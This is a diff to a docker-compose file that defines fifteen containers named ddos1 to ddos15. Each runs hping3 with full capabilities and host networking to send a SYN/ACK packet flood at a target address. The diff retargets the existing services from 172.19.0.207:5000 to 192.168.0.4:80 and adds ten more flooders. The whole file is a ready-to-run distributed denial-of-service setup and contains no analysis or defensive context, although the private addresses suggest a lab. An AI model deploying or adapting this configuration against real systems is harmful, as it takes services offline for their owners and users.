@@ -5,7 +5,7 @@ services:
         network_mode: host
         stdin_open: true
         tty: true
-        entrypoint: ["hping3", "172.19.0.207", "-p", "5000", "-S", "-A", "--flood", "-d", "1000"]
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
         cap_add:
         - ALL
     ddos2:
@@ -13,7 +13,7 @@ services:
         network_mode: host
         stdin_open: true
         tty: true
-        entrypoint: ["hping3", "172.19.0.207", "-p", "5000", "-S", "-A", "--flood", "-d", "1000"]
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
         cap_add:
         - ALL
     ddos3:
@@ -21,7 +21,7 @@ services:
         network_mode: host
         stdin_open: true
         tty: true
-        entrypoint: ["hping3", "172.19.0.207", "-p", "5000", "-S", "-A", "--flood", "-d", "1000"]
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
         cap_add:
         - ALL
     ddos4:
@@ -29,7 +29,7 @@ services:
         network_mode: host
         stdin_open: true
         tty: true
-        entrypoint: ["hping3", "172.19.0.207", "-p", "5000", "-S", "-A", "--flood", "-d", "1000"]
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
         cap_add:
         - ALL
     ddos5:
@@ -37,6 +37,86 @@ services:
         network_mode: host
         stdin_open: true
         tty: true
-        entrypoint: ["hping3", "172.19.0.207", "-p", "5000", "-S", "-A", "--flood", "-d", "1000"]
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos6:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos7:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos8:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos9:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos10:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos11:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos12:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos13:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos14:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
+        cap_add:
+        - ALL
+    ddos15:
+        image: sflow/hping3:latest
+        network_mode: host
+        stdin_open: true
+        tty: true
+        entrypoint: ["hping3", "192.168.0.4", "-p", "80", "-S", "-A", "--flood", "-d", "1000"]
         cap_add:
         - ALL
